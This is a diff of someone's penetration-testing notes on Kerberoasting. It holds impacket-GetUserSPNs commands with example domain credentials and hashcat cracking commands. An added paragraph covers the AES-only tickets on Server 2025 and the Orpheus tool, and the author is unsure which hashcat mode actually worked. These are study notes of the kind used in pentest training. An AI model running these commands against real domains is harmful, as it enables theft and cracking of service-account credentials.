@@ -141,8 +141,11 @@ impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 192.168.1.10
 impacket-GetUserSPNs target.local/username:password -dc-ip <Domain_Controller_IP> -request -outputfile kerberoast_hashes.txt
 # Due to recent MS hardening RC4 won't work
 # Must derive AES key from user pass
-https://raw.githubusercontent.com/TacticalGator/ADKeygen/refs/heads/main/ADKeygen.py
+#Didn't work https://raw.githubusercontent.com/TacticalGator/ADKeygen/refs/heads/main/ADKeygen.py
 
+Kerberoasting on Server 2025: RC4 disabled by KDC, Impacket GetUserSPNs fails with ETYPE_NOSUPP (no AES-forcing flag). Orpheus (TrustedSec) with enc 18 → AES256 TGS. Crack with hashcat -m 19700.
+https://github.com/trustedsec/orpheus
+hashcat -m 13100 -a 0 spns.txt $ROCKYOU #this worked, evem when using enc 18?
 
 ###
 Mini meta notes:
